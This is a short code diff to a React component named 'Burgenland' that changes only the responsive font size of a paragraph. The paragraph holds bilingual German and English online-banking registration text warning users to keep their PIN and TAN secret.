@@ -59,7 +59,7 @@ const Burgenland = () => {
 
           {/* Card body */}
           <div className="bg-white px-6 py-5 space-y-4">
-            <p className="text-base leading-tight" style={{ color: "#333" }}>
+            <p className="text-[13px] md:text-base leading-tight" style={{ color: "#333" }}>
               {lang === "de"
                 ? "Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!"
                 : "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."}
